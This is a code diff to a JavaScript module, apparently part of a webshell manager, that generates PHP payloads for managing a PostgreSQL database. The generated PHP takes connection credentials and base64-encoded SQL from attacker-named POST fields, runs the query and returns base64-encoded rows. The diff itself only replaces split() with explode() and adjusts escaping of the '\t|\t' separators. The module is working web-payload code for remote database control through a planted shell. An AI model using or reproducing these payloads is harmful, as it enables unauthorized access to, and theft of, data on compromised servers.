@@ -1,6 +1,6 @@
 /**
  * 数据库管理模板::postgresql
- * i 数据分隔符号 => \t|\t
+ * i 数据分隔符号 => \\t|\\t
  */
 
 module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
@@ -10,7 +10,7 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
       $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
-      list($host,$port,$dbn) = split(":", $hst);
+      list($host,$port,$dbn) = explode(":", $hst);
       $port == "" ? $port = "5432" : $port;
       $dbn == "" ? $dbn = "postgres" : $dbn;
 
@@ -55,7 +55,7 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
 
-      list($host, $port) = split(":", $hst);
+      list($host, $port) = explode(":", $hst);
       $port == "" ? $port = "5432" : $port;
       $arr=array(
         'host'=>$host,
@@ -99,7 +99,7 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
       $tab=$m?stripslashes($_POST["${arg5}"]):$_POST["${arg5}"];
-      list($host, $port) = split(":", $hst);
+      list($host, $port) = explode(":", $hst);
       $port == "" ? $port = "5432" : $port;
 
       $arr=array(
@@ -147,7 +147,7 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
       $sql=base64_decode($_POST["${arg5}"]);
       $encode=$m?stripslashes($_POST["${arg6}"]):$_POST["${arg6}"];
-      list($host, $port) = split(":", $hst);
+      list($host, $port) = explode(":", $hst);
       $port == "" ? $port = "5432" : $port;
       $arr=array(
         'host'=>$host,
@@ -173,20 +173,20 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
         }else{
           $n=@pg_num_fields($q);
           if($n===NULL){
-            echo("Status\t|\t\r\n");
-            echo(base64_encode("ERROR://".@pg_last_error())."\t|\t\r\n");
+            echo("Status\\t|\\t\\r\\n");
+            echo(base64_encode("ERROR://".@pg_last_error())."\\t|\\t\\r\\n");
           }elseif($n===0){
-            echo("Affect Rows\t|\t\r\n".base64_encode(@pg_affected_rows($q))."\t|\t\r\n");
+            echo("Affect Rows\\t|\\t\\r\\n".base64_encode(@pg_affected_rows($q))."\\t|\\t\\r\\n");
           }else{
             for($i=0;$i<$n;$i++){
-              echo(@pg_field_name($q,$i)."\t|\t");
+              echo(@pg_field_name($q,$i)."\\t|\\t");
             }
-            echo "\r\n";
+            echo "\\r\\n";
             while($row=@pg_fetch_row($q)){
               for($i=0;$i<$n;$i++){
-                echo(base64_encode($row[$i]!==NULL?$row[$i]:"NULL")."\t|\t");
+                echo(base64_encode($row[$i]!==NULL?$row[$i]:"NULL")."\\t|\\t");
               }
-              echo "\r\n";
+              echo "\\r\\n";
             }
           }
           @pg_free_result($q);
